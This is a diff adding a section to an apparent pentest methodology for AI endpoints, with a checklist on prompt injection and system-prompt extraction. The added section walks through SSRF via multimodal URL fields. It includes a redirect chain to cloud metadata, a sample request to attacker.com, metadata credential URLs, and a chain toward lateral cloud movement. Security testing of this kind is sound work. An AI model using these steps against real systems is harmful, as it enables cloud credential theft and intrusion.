@@ -102,3 +102,43 @@ Extract system prompts to prove injection — do not exfiltrate user data throug
 - [ ] AI endpoints identified  - [ ] Direct prompt injection tested  - [ ] Indirect injection via data sources
 - [ ] Tool/function enumeration  - [ ] Tool-use injection attempted  - [ ] MCP tool descriptions inspected
 - [ ] AI gateway probed  - [ ] Training data extraction (bounded)  - [ ] FP gate  - [ ] Handoffs queued  - [ ] chain run
+
+## DEEP RESEARCH ADDITIONS (v3)
+
+### Multimodal Input SSRF
+```
+OpenAI-compatible API endpoints accepting image_url, audio_url, or file_url fields
+follow redirects to internal IPs after initial URL validation passes. This is a
+validate-then-request TOCTOU (time-of-check-time-of-use) flaw that is expanding
+as more applications deploy multimodal AI inference.
+
+METHODOLOGY:
+1. Identify AI/LLM API endpoints accepting media URLs:
+   - image_url in vision/multimodal chat completions
+   - audio_url in speech-to-text or audio analysis endpoints
+   - file_url in document processing or RAG ingestion endpoints
+2. Set up a redirect chain:
+   a. Public URL → 302 redirect → http://169.254.169.254/latest/meta-data/
+   b. The API validates the initial public URL (passes validation)
+   c. The API follows the redirect to the cloud metadata endpoint (TOCTOU bypass)
+3. Test each media URL parameter:
+   POST /v1/chat/completions
+   {"model": "gpt-4-vision", "messages": [{"role": "user", "content": [
+     {"type": "image_url", "image_url": {"url": "https://attacker.com/redirect"}}
+   ]}]}
+4. Also test direct internal URLs — some implementations lack even basic filtering:
+   - http://169.254.169.254/latest/meta-data/iam/security-credentials/
+   - http://metadata.google.internal/computeMetadata/v1/
+   - http://169.254.169.254/metadata/identity/oauth2/token (Azure IMDS)
+5. If cloud metadata or internal content is returned in the model's response,
+   error message, or through timing/behavior differences → SSRF confirmed
+6. Chain: multimodal SSRF → cloud credential theft → lateral cloud movement
+7. Handoff to ssrf-hunter for deeper SSRF exploitation and filter bypass
+
+This is an expanding attack surface as more applications deploy multimodal AI
+inference. Every new modality (image, audio, video, document) that accepts URLs
+is a potential SSRF sink.
+
+CVE-2026-63764 (LMDeploy, CVSS 9.2): OpenAI-compatible vision endpoint followed
+redirects from image_url to internal cloud metadata, exposing IAM credentials.
+```
